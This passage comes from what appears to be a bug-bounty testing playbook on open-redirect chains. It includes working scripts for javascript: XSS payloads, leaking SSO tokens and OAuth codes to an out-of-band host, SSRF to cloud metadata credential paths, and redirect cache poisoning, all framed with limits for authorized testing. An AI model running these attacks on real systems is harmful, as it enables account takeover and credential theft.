  `//allowed.host/` is a JavaScript comment that the encoded newline ends. An ends-with check is satisfied by
  `…//https://allowed.host/`. A tab or newline inside the scheme is deleted by the browser's URL parser after the
  server's string comparison has passed.
- **How:**
  ```bash
  Q="$T/login?next="; OK="$H"         # an inventory endpoint up to the value; the host its check accepts
  D="$E/evidence/$H/RDR-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # %250a reaches the page as %0a, which the browser decodes into a newline only when it runs the URL
  cat > "$D/values.txt" <<EOF
  javascript:alert(document.domain)
  JaVaScRiPt:alert(document.domain)
  java%09script:alert(document.domain)
  java%0Ascript:alert(document.domain)
  %09javascript:alert(document.domain)
  %01javascript:alert(document.domain)
  javascript://$OK/%250aalert(document.domain)
  javascript://%250aalert(document.domain)//$OK
  javascript:alert(document.domain)//https://$OK/
  javascript:alert(document.domain)%3B//$OK
  EOF
  # where each value lands: a Location header (a dead end), a link or form, or a script assignment
  while IFS= read -r v; do
    r=$(curl -sS -g "${HDR[@]}" -o "$D/body.html" -w '%{http_code}\t%header{location}' "$Q$v")
    s=$(grep -aoiE '(href|action|src|formaction)=.{0,3}[^ >]{0,12}script[^ >]{0,50}|(location[a-z.]*|open)[ =(]+[^;]{0,80}script' "$D/body.html" | head -1)
    printf '%s\t%s\t%s\n' "$r" "$s" "$v"; sleep "$W"
  done < "$D/values.txt" | tee "$D/landing.tsv"
  cat > "$D/fire.js" <<'JS'
  // fire.js <evidence dir> <headers file with a Cookie: line, or -> <url> ... -- <the HDR arguments>
  // loads each URL, clicks one rendered script link when no dialog fired by itself, logs every dialog
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const a = process.argv.slice(2), i = a.indexOf('--'), [dir, ck] = a, urls = a.slice(2, i < 0 ? a.length : i), h = i < 0 ? [] : a.slice(i + 1), hd = {}; let ua;
    for (let k = 0; k + 1 < h.length; k += 2) h[k] === '-A' ? ua = h[k + 1] : hd[h[k + 1].split(':')[0]] = h[k + 1].replace(/^[^:]*:\s*/, '');
    const cookie = ck === '-' ? '' : (fs.readFileSync(ck, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1];
    const b = await chromium.launch();
    for (const u of urls) {
      const c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage(); let clicks = 0, fired = false;
      if (cookie) await c.addCookies(cookie.split(/;\s*/).filter(x => x.includes('='))
        .map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(u).origin })));
      p.on('dialog', async d => { fired = true; fs.appendFileSync(`${dir}/dialog.txt`, `${d.message()}\tclicks=${clicks}\t${u}\n`); await d.accept(); });
      await p.goto(u, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {}); await p.waitForTimeout(3000);
      const l = p.locator('a[href*="script:" i]').first();
      if (!fired && await l.count()) { clicks = 1; await l.click({ timeout: 3000 }).catch(() => {}); await p.waitForTimeout(2000); }
      await p.screenshot({ path: `${dir}/fire-${Date.now()}.png` }).catch(() => {}); await c.close();
    }
    await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$D" - $(sed "s|^|$Q|" "$D/values.txt") -- "${HDR[@]}"; cat "$D/dialog.txt" 2>/dev/null
  ```
  A redirect that happens only for a signed-in user is run with `"$E/accounts/B.headers"` in place of `-`, so B
  is the victim.
- **Proof:** `dialog.txt` with the application's host from `document.domain`, the URL that produced it, the
  number of clicks after opening it (0 or 1), the rendered element or the sink line from `landing.tsv`, and the
  screenshot. Rate it as reflected XSS unless XSS-018 shows more.
- **Not a finding when:** the value is only ever written into `Location` (a 30x) or into a meta refresh or a
  `Refresh` header: browsers do not run a script URL from a redirect, and Chromium refuses a `javascript:`
  refresh. The dialog names another origin (a sandbox, a CDN, a user-content host). A Content-Security-Policy
  without `'unsafe-inline'` blocks `javascript:` URLs; the console shows the refusal (XSS-015 looks for a way
  round it). The rendered link is not what you sent: Angular prefixes `unsafe:`, recent React replaces the URL
  with one that throws. A `data:` destination runs in an opaque origin, and browsers block top-level `data:`
  navigation.
- **Escalate:** XSS-018 for the account action that makes it High. On a sign-in or OAuth page, script in the
  origin reads the hand-off token or the code as it arrives: RDR-007, RDR-008 and the OAU items.

### RDR-007 · A sign-in or SSO hand-off appends a token, code or CSRF value to a return URL that can point at our host

| | |
|---|---|
| **Severity** | High standalone when the value that leaves signs us in as the victim after one click; Medium when it is a CSRF token that a forgeable sensitive action needs |
| **Requires** | login, redirect-param, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Insufficiently Protected Credentials · CWE-522 |
| **Prior art** | #49759, #50752, #3419636, #1327742 |

- **Where:** every flow in which the server issues a credential to a URL: single sign-on between the programme's
  own hosts (`accounts.` to `app.` with `?token=`, `?ticket=`, `?code=`), "Sign in with <programme>" for its own
  apps, desktop, CLI and browser-extension sign-in (`/cli/login?callback=http://127.0.0.1:…`), magic-link and
  e-mail-verification landings that sign the user in and then forward, "connect an integration" returns, and
  pages that put a CSRF token or an API key in a URL (`?authenticity_token=`, `?_token=`, `?api_key=`) next to a
  redirect (#49759, #50752). The proxy history shows them as 30x responses whose `Location` carries a
  credential-shaped parameter.
- **Test:** the hand-off appends the credential to whatever return URL it accepted. If that URL can name our host
  (directly or with an RDR-002 value), the victim's browser delivers the credential to us when they open one link
  while signed in. Read the hand-off's `Location` with A signed in (A stands in for the victim) and never follow
  it to a host we do not control; then show the value works by replaying it on the real return URL from an empty
  cookie jar.
- **How:**
  ```bash
  HO="$T/sso/handoff"; N=return_to; CB="$T/session/callback"   # the hand-off, its return parameter, the return URL it normally uses
  D="$E/evidence/$H/RDR-007"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. hand-offs in the proxy history: redirects whose Location carries a credential-shaped parameter
  grep -rhiE '^location:.*[?&#](token|code|ticket|session|sid|sso|auth|jwt|access_token|id_token|authenticity_token|csrf[a-z_]*|_token|api_key|otp)=' \
    "$E/recon/$H/" | cut -c1-200 | sort | uniq -c | sort -rn | head -20
  # 2. A signed in: external return values (add the RDR-002 value that beat this check); read Location, never follow it
  for v in "https://$X/rdr007" "//$X/rdr007" "https://$H.$X/rdr007" "https://$H@$X/rdr007" "https://$X\\@$H/rdr007" "https://$X/rdr007?.$H"; do
    printf '%s\t%s\n' "$(curl -sS "${HDR[@]}" $A -o /dev/null -w '%{http_code}\t%header{location}' --get --data-urlencode "$N=$v" "$HO")" "$v"; sleep "$W"
  done | tee "$D/handoff.tsv"
  # 3. a credential reached a Location on our host: replay it on the real return URL from an empty jar, then one identity call
  L=$(awk -F'\t' -v x="$X" 'index($2, x) {print $2; exit}' "$D/handoff.tsv"); echo "$L" > "$D/leaked-location.txt"
  QS=${L#*\?}; QS=${QS%%#*}                 # the query it carried; for a fragment use QS=${L#*#}
  curl -sS "${HDR[@]}" -c "$D/fresh.jar" -o /dev/null -w '%{http_code} %header{location}\n' "$CB?$QS"
  curl -sS "${HDR[@]}" -b "$D/fresh.jar" "$T/api/me" | head -c 300; echo   # the application's own who-am-I call: names A or not, then stop
  # 4. CSRF tokens or keys in URLs next to a redirect (a path-based redirect forwards the whole query)
  grep -rhoE "https?://$H/[^\"' <>]*[?&](authenticity_token|csrf[a-z_]*|_token|xsrf[a-z_]*|api_key)=[^&\"' <>]+" "$E/recon/$H/" | sort -u | head
  ```
- **Proof:** the hand-off request and its raw 30x with A's credential in a `Location` on our host (and the
  `$OOB` log line when a browser followed it), the replay on the legitimate return URL from an empty cookie jar,
  and one read-only identity call that names A. Nothing else is done with the session. For a CSRF token: the
  leaked token, and one forged request on A's own account that the token makes succeed.
- **Not a finding when:** the value that leaves is not a credential (a public user id, a `state` or tracking
  value): the replay changes nothing. The token is bound to the browser that started the flow (a cookie or a
  PKCE verifier checked at the callback) and the replay from an empty jar is refused: write the binding as the
  mechanism. Only the programme's own hosts are accepted; a sibling host is a lead for STO or XSS items, not this
  finding. The token is single-use and the legitimate callback spent it before the redirect left. A CSRF token
  leaks but every state-changing request also needs a `SameSite=Lax` or `Strict` cookie that a cross-site form
  does not send: the token buys nothing.
- **Escalate:** the end state is account takeover after one click: write it as that. A long-lived API or refresh
  token: name its scope from the documentation and do not exercise it. The same return parameter with a script
  scheme: RDR-006. The OAuth form of the same chain: RDR-008 and OAU-002.

### RDR-008 · An open redirect inside an OAuth client's registered redirect space passes the victim's code or token to our host

| | |
|---|---|
| **Severity** | High standalone when the victim's token, or a code the client still redeems, reaches our host after one click and signs us in; None when the code arrives but nobody can redeem it |
| **Requires** | oauth-login\|oauth-provider, account, oob, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #3423013, #55525, #3930, #677617 |

- **Where:** the OAuth clients whose registered redirect host is this asset: the programme's "Sign in with
  Google, GitHub, Apple, Facebook" apps, the clients of the programme's own identity provider, and, on an
  `oauth-provider` asset, the first-party clients' hosts. The forwarders are the redirects RDR-001 to RDR-005
  recorded on those hosts (`$E/evidence/<host>/RDR-00*/`). OAU-002 is the same chain seen from the provider; one
  root cause is one report.
- **Test:** the provider accepts a `redirect_uri` anywhere in the space the client registered (another path, a
  query string, a sub-domain) and sends the code there. A forwarder at that URL hands its own URL on: a
  path-based one keeps the query, so the code travels; a parameter-based one usually drops the query, but a code
  or token in the fragment survives the 30x because the browser re-attaches the fragment to the new location. We
  start the sign-in ourselves, so `state` and any PKCE verifier belong to our session; the victim's code then
  completes our flow, and PKCE does not stop it.
- **How:**
  ```bash
  LB="$T/auth/google"                              # the URL behind a "Sign in with ..." button (sign-in page or crawl)
  FW="$T/out?url=https%3A%2F%2F$OOB%2Frdr008"      # a forwarder on the registered host that ends on our host (path form: "$T//$OOB/rdr008")
  D="$E/evidence/$H/RDR-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); AJ="$D/attacker.jar"
  # 1. we start the sign-in: the authorize URL, its state and any PKCE challenge now belong to our jar
  AU=$(curl -sS "${HDR[@]}" -c "$AJ" -b "$AJ" -o /dev/null -w '%header{location}' "$LB"); echo "$AU" > "$D/authorize.txt"
  qv(){ python3 -c 'import sys, urllib.parse as u; print(dict(u.parse_qsl(u.urlsplit(sys.argv[1]).query)).get(sys.argv[2], ""))' "$AU" "$1"; }
  swap(){ python3 -c 'import sys, urllib.parse as u
  s = u.urlsplit(sys.argv[1]); q = [(k, sys.argv[2] if k == "redirect_uri" else v) for k, v in u.parse_qsl(s.query, keep_blank_values=True)]
  print(u.urlunsplit(s._replace(query=u.urlencode(q))))' "$AU" "$1"; }
  RU=$(qv redirect_uri)
  # 2. which redirect_uri values the provider accepts for this client; signed out is enough, a refused value gets its error page
  for V in "$RU" "https://$OOB/rdr008-foreign" "${RU%%\?*}?rdr008=1" "${RU%/*}/rdr008-other-path" "$FW"; do
    printf '%s\t%s\n' "$(curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code}\t%{size_download}\t%header{location}' "$(swap "$V")")" "$V"; sleep "$W"
  done | tee "$D/accepted.txt"                     # accepted answers like the first line, refused like the second
  # 3. does the forwarder pass a query on? (a fragment never reaches it; the browser keeps it across the 30x)
  case "$FW" in *\?*) SEP='&';; *) SEP='?';; esac
  curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}\n' "${FW}${SEP}code=rdr008marker"
  # 4. the victim (our own test identity, signed in at the provider in the browser) opens our authorize URL with the forwarder in it
  cat > "$D/victim.js" <<'JS'
  // victim.js <provider storage-state file> <url>: open the URL as the signed-in victim and print where the browser ends
  const { chromium } = require('playwright');
  (async () => {
    const [state, url] = process.argv.slice(2), b = await chromium.launch(), c = await b.newContext({ storageState: state }), p = await c.newPage();
    await p.goto(url, { timeout: 20000 }).catch(() => {}); await p.waitForTimeout(5000); console.log(p.url()); await b.close();
  })();
  JS
  # the state file: sign in at the provider once as our test identity, e.g. npx playwright codegen --save-storage="$D/provider-state.json" <its sign-in page>
  NODE_PATH="$(npm root -g)" node "$D/victim.js" "$D/provider-state.json" "$(swap "$FW")"
  # 5. the $OOB log line for /rdr008 carries code=; redeem it on the client's own callback from our jar, then one identity call
  C='<code from the $OOB log>'
  curl -sS -g "${HDR[@]}" -b "$AJ" -c "$AJ" -o /dev/null -w '%{http_code} %header{location}\n' --get "$RU" --data-urlencode "code=$C" --data-urlencode "state=$(qv state)"
  curl -sS "${HDR[@]}" -b "$AJ" "$T/api/me" | head -c 300; echo
  ```
  A token in the fragment is never sent to a server: serve a page at `/rdr008` on a host we control that sends
  `location.hash` to its own log (OAU-003 has one), and ask for it with `response_type=token`.
- **Proof:** the provider accepting the forwarder as `redirect_uri` (`accepted.txt`), the `$OOB` log line for
  `/rdr008` carrying the victim's `code=` or `access_token=`, the redemption from our cookie jar, and one identity
  call that names the victim (our own test identity). The victim's part is one click on our link while signed in
  at the provider.
- **Not a finding when:** every value outside the exact registered `redirect_uri` is refused: the forwarder is a
  plain open redirect (`open-redirect`). The code reaches us but the client's callback cannot redeem it, because
  the provider binds the code to the `redirect_uri` it was issued for (RFC 6749 §4.1.3) while the client sends
  its registered one: ask for a token in the fragment instead (OAU-003), or write the binding as the mechanism.
  The forwarder drops the query and the provider answers only in the query. The code arrives only after the
  client spent it. The provider misbehaves for every client, which is a bug in its product (`third-party`); a
  broad registration by the programme is the programme's.
- **Escalate:** OAU-003 for `response_type=token` and `response_mode=fragment`; the OAU items on code redemption
  and token scopes decide what the stolen value opens.

### RDR-009 · A server-side fetcher that only trusts the target's own hosts follows an open redirect on one of them to an internal address

| | |
|---|---|
| **Severity** | High standalone when the fetcher returns the internal response; Critical when that response holds cloud instance credentials; Medium when blind with a measured oracle |
| **Requires** | url-fetch |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #771465, #287496, #3286945 |

- **Where:** fetchers (webhooks, import by URL, link previews, avatar from URL, PDF and screenshot renderers, OIDC
  discovery and SAML metadata URLs) that refuse both an external host and an internal address when given
  directly, but accept URLs on the programme's own hosts. The redirect can sit on any of those hosts, including
  other assets: take it from their RDR-001 to RDR-005 evidence. SSR-001 lists this asset's fetchers.
- **Test:** the allow-list checks the first URL; the HTTP client then follows the target's own 30x to a
  destination nobody checked. Prove the follow with our host first (the `$OOB` log shows the fetcher's
  User-Agent arriving through the redirect), then point the same redirect at an internal address. A fetcher is
  not a browser: it does not normalise paths, so RDR-003's curl-only forms work, and a headless-browser renderer
  also follows RDR-005's script and meta-refresh redirects.
- **How:**
  ```bash
  F="$T/api/preview"; FP=url                       # this asset's fetcher and its URL parameter (SSR-001 lists them)
  R="$T/out?url="                                  # a parameter redirector on a host the fetcher accepts, up to the destination
  D="$E/evidence/$H/RDR-009"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  enc(){ python3 -c 'import sys, urllib.parse as u; print(u.quote(sys.argv[1], safe=""))' "$1"; }
  f(){ curl -sS -g "${HDR[@]}" $A -o "$D/$2.bin" -w "$2 %{http_code} %{size_download} %{time_total}\n" --get --data-urlencode "$FP=$1" "$F"; sleep "$W"; }
  # 1. control: both destinations refused when given directly
  f "https://$X/rdr009-direct" direct-oob; f "http://169.254.169.254/latest/meta-data/" direct-imds
  # 2. the same destinations through the target's redirector; with $OOB, its log shows the fetcher arriving at /rdr009-via
  f "$R$(enc "https://$X/rdr009-via")" via-oob
  f "$R$(enc "http://169.254.169.254/latest/meta-data/iam/security-credentials/")" via-imds
  f "$R$(enc "http://127.0.0.1/")" via-loopback
  head -c 400 "$D/via-imds.bin"; echo
  ```
  Drop `$A` when the fetcher needs no session. GCP and Azure metadata need a request header and AWS IMDSv2 a
  `PUT` first; SSR-003 says which fetchers can reach them.
- **Proof:** the direct requests refused, the same destination through the redirector answered, and the internal
  content saved raw: the role name or instance identity document (secret redacted, `Expiration` shown) or a
  loopback service's banner; for a blind fetcher, the SSR-002 oracle table with a control address that cannot
  exist. A credential is used for at most one read-only identity call, where the policy allows even that.
- **Not a finding when:** the fetcher re-checks every hop: the first test arrives at `$OOB` but the internal
  destination fails with the same error as the direct attempt. The fetcher resolves each hop and follows only to
  public addresses. The fetch comes from a third-party image or preview service, not from the target's network
  (`third-party`). A callback through the redirect with no internal reach is SSR-001's primitive, not this
  finding.
- **Escalate:** SSR-003 for what the address returns; SSR-009 when the client is curl-based and follows a
  redirect to another scheme; SSR-010 to map a blind fetcher's reach with a short, justified list.

### RDR-010 · A redirect built from Host or X-Forwarded-Host is stored by the shared cache and served to visitors who never sent the header

| | |
|---|---|
| **Severity** | Medium standalone when a clean client receives our `Location` from the cache for a page; High when the cached redirect is a script or stylesheet the site loads, or the sign-in page |
| **Requires** | cache |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Open Redirect · CWE-601 |
| **Prior art** | #1795197, #1444675, #1479889, #7357 |

- **Where:** cacheable responses that redirect: the root to a locale, directory and trailing-slash redirects,
  `www` canonicalisation, the sign-in redirect for anonymous visitors, static asset paths that answer 301
  (#1795197 is titled as a poisoned redirect on JavaScript files). Run it on every host name behind the cache: the
  cache key and the forwarded headers differ per host.
- **Test:** the application builds an absolute `Location` from `X-Forwarded-Host` (or a sibling header, or an
  absolute request line) and the cache leaves that header out of its key, so one request with the header stores
  a redirect to our host that the cache serves to everyone who asks for the same key. Every request in this test
  carries a cache buster we chose, and only after step 0 shows the buster is part of the key: the real page's
  entry is never touched.
- **How:**
  ```bash
  P="/"           # a path that answers 30x to an anonymous visitor here: "/", a locale root, a directory, a script path
  D="$E/evidence/$H/RDR-010"; mkdir -p "$D"; X="${OOB:-example.org}"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; printf "%.2f", (w<1?1:w)}')
  cc(){ grep -iE '^(age|x-cache|cf-cache-status|x-served-by|cf-ray|vary|cache-control):' "$1" | tr -d '\r' | tr '\n' ' '; }
  # 0. the buster must be part of the cache key, or every later request would poison the real page
  for cb in "rdr010a$RANDOM" "rdr010b$RANDOM"; do for n in 1 2; do
    curl -sS "${HDR[@]}" -o /dev/null -D "$D/key.$cb.$n" "$T$P?$cb=1"; echo "$cb try $n: $(cc "$D/key.$cb.$n")"; sleep "$W"; done; done | tee "$D/key.txt"
  # wanted: a miss then a hit for each buster. A hit on a buster's first try means the query is not keyed: stop here.
  # Two misses for both busters: this path is not cached at all; pick another redirecting path before going on.
  # 1. one fresh buster per header: the request with our host, then the same URL from a clean client without it
  for hv in "X-Forwarded-Host: $X" "X-Host: $X" "X-Forwarded-Server: $X" "X-Original-Host: $X" "X-HTTP-Host-Override: $X" "Forwarded: host=$X"; do
    cb="rdr010$RANDOM"
    w=$(curl -sS "${HDR[@]}" -H "$hv" -o /dev/null -w '%{http_code} %header{location}' "$T$P?$cb=1"); sleep "$W"
    c=$(curl -sS "${HDR[@]}" -o /dev/null -D "$D/clean.$cb" -w '%{http_code} %header{location}' "$T$P?$cb=1")
    printf '%-28s | with: %-45s | clean: %-45s | %s\n' "$hv" "$w" "$c" "$(cc "$D/clean.$cb")"; sleep "$W"
  done | tee "$D/results.txt"
  # 2. an absolute request line: some servers build Location from it instead of from Host; then the clean request
  curl -sS "${HDR[@]}" --request-target "https://$X$P?rdr010rt=1" -o /dev/null -w 'with:  %{http_code} %header{location}\n' "$T$P?rdr010rt=1"; sleep "$W"
  curl -sS "${HDR[@]}" -o /dev/null -D "$D/clean.rt" -w 'clean: %{http_code} %header{location}\n' "$T$P?rdr010rt=1"; cc "$D/clean.rt"; echo
  ```
  Never send a header from this list without a buster, and do not repeat requests to keep a poisoned entry alive:
  it expires on its own TTL, which the report states.
- **Proof:** `key.txt` showing the buster is keyed (the real page was never poisoned), the request with the
  header, and the clean request without it receiving our `Location` with `X-Cache: HIT` or a rising `Age`, all
  raw. For a script path, the page that loads the script and the busted script URL answering a cached 30x to
  `$X`. Name the edge that served it (`CF-Ray`, `X-Served-By`): the entry lives in one location.
- **Not a finding when:** `with:` shows our host and `clean:` does not: the header is in the key (`Vary`), the
  redirect is `private` or `no-store`, or the cache drops the header before the origin. That is a host header
  reflected with no consumer (`host-header`): park it, and hand it to AUT-001 if the same header writes e-mailed
  links. Both busters' first requests are hits: the query is not in the key, so any test here would poison the
  real page; stop and leave it to the CCH chapter's keyed inputs. The header changes only the scheme or port on
  the same host (`X-Forwarded-Proto`, `X-Forwarded-Port`): a cached loop is a denial of service (`dos`), not this
  item.
- **Escalate:** a poisoned redirect on a script or stylesheet path puts our code on every page that loads it:
  write it as stored XSS through cache poisoning (CCH items, XSS-018). A poisoned sign-in redirect sends every
  anonymous visitor's sign-in to our host, and RDR-008 shows what that carries.

## Graveyard

- **A redirect alone** (`open-redirect`). "The user can be sent to an arbitrary site" is a phishing aid;
  programmes close it as informative or list it out of scope, and the library rates most of the class nothing or
  low (333 unrated and 18 low of 362). RDR-001 to RDR-005 carry no exclusion tag on purpose: on a programme that
  excludes open redirects they still run, because RDR-006 to RDR-009 need the redirects they find. Their result
  is recorded `parked`, with the chain partner in the note, and is reported only inside a chain.
- **`javascript:` in a `Location` header or a meta refresh.** Browsers do not run a script URL from a 30x, and
  Chromium refuses a `javascript:` refresh; a report that shows only `Location: javascript:alert(1)` is closed as
  not applicable. The script scheme pays only through a link or a script sink (RDR-006).
- **A warned redirect.** An interstitial that names the destination and waits for a click ("You are leaving …")
  is the design. A value that skips the warning is RDR-002 (#541862 and #28865 were paid as filter bypasses).
- **A redirect to the programme's own hosts or to a partner on its allow-list.** Works as designed. A sibling
  host that can be taken over or that runs our script is a lead for the STO or XSS items, not a redirect finding.
- **A redirect only a header can trigger** (`host-header`). `Host` or `X-Forwarded-Host` decides `Location`, but
  nothing caches it and no link carries it: an attacker cannot set a victim's request headers. It becomes RDR-010
  when a cache stores it and AUT-001 when the same header writes e-mailed links.
- **POST-only and Referer-driven redirects.** A redirect reached only by a cross-site form post (#1129761,
  #242243, #1310230) or one that sends the user back to their `Referer` (#5199, #683925) starts on the attacker's
  page, so it gains nothing over that page redirecting by itself.
- **Look-alike destinations.** A check that accepts any host ending in the target's name, or a homoglyph, is a
  real bypass, but the full attack needs a registered domain that imitates the target: do not register one.
  Report the accepted `Location` and stop. Homograph reports on their own carry no bounty in the library
  (#1285245, #59372).
- **Reverse tabnabbing filed as an open redirect** (`tabnabbing`). Paid where programmes accepted it (#537840,
  $900; #179568, $666; #1145563, $500). Browsers now treat `target="_blank"` as `noopener`, and most policies
  exclude the class; only `window.open()` without `noopener` still hands over `window.opener`.
- **Hyperlink injection in e-mails the platform sends** (`content-spoofing`). A link we choose inside an
  invitation or notification (#164833 and #158554, $100 each; #843421, $50) is content spoofing, not a redirect.
- **Third-party redirectors** (`third-party`). An e-mail provider's click tracker on a programme CNAME, a link
  shortener, a SaaS help centre's own redirect, a bug inside an identity provider's product.
- **A framework's redirect advisory matched by version** (`known-cve`). The Rails `redirect_to` reports
  (#1865991, #904059) and Airflow's sign-in redirect (#1782514) were filed upstream; on a target the CVE chapter
  verifies the advisory's own check first.
- **Scanner output** (`automated`). Open-redirect templates match a value reflected in the body or a `Location`
  that stays on the host. The browser landing is the test.
- **Fixed links to dead domains.** A hard-coded redirect or link to a domain that has expired (#207431, #52532)
  is broken-link hijacking, not an open redirect; the STO chapter decides it. Mobile deep links and web views
  (#424443, #401940) belong to the mobile chapter.
- **Duplicates.** The `?next=` on the sign-in page of a long-running public programme has been reported before
  you found it. A bypass of a fixed report is new work, not a duplicate.

## Chains

- RDR-001 to RDR-005 → RDR-006 and XSS-004: the same endpoint with a script scheme; then XSS-018 for the account
  action that makes it High.
- RDR-003 (keeps the query string) and RDR-001 → RDR-008 → OAU-002, OAU-003: a forwarder inside an OAuth client's
  redirect space; `response_type=token` makes query-dropping forwarders work, because the browser keeps the
  fragment across a 30x.
- RDR-004 → RDR-007: the hop after sign-in is where hand-off tokens are appended.
- Any redirect on a host a fetcher trusts → RDR-009 → SSR-003, SSR-009, SSR-010; a headless renderer (SSR-007)
  also follows RDR-005's script redirects.
- RDR-010 → CCH items and XSS-018: a cached redirect on a script path is our script on every page that loads it
  (#1795197).
- CRL items: a `%0d%0a` in a redirect value that reaches `Location` splits the response (#2012519 and #181939 are
  titled as CRLF and open redirect together).
- Client-side path traversal: a same-origin redirect turns a traversal-controlled `fetch()` into a request for our
  JSON or script, because `fetch` follows redirects (#1245165).
- STO: an allow-list that accepts every sub-domain, plus a dangling sub-domain, gives a forwarder without any
  redirect bug.
- Desktop and Electron clients that trust the web origin: an open redirect on it loads our page inside the app
  (#3972760).
- XSS-015: a `script-src` entry restricted by path is bypassed through an open redirect on any listed host,
  because CSP ignores the path once a request has been redirected.
- AUT-001: the `X-Forwarded-Host` that RDR-010 found reflected, used on the password-reset request instead.

## Sources

- `kb/reports/redirect.md` and `kb/reports/all/redirect.md`: the disclosed reports this chapter is built from;
  `kb/reports/cache.md` and `kb/reports/oauth.md` for RDR-010 and RDR-008.
- HexBrain: `get_testing_playbook {"topic":"Open Redirect"}`, `find_bypasses {"protection":"open redirect allow-list"}`, `find_payloads {"topic":"Open Redirect"}`.
- PortSwigger Web Security Academy: DOM-based open redirection; stealing OAuth access tokens via an open
  redirect; SSRF with filter bypass via open redirection; web cache poisoning.
- OWASP WSTG-CLNT-04 (Testing for Client-side URL Redirect); OWASP Unvalidated Redirects and Forwards Cheat Sheet;
  PayloadsAllTheThings, Open Redirect.
- WHATWG URL Standard: the parser browsers use, and Node's `URL` class. RFC 9110 §10.2.2: a `Location` without a
  fragment inherits the request's fragment. RFC 6749 §10.15: open redirectors in OAuth.
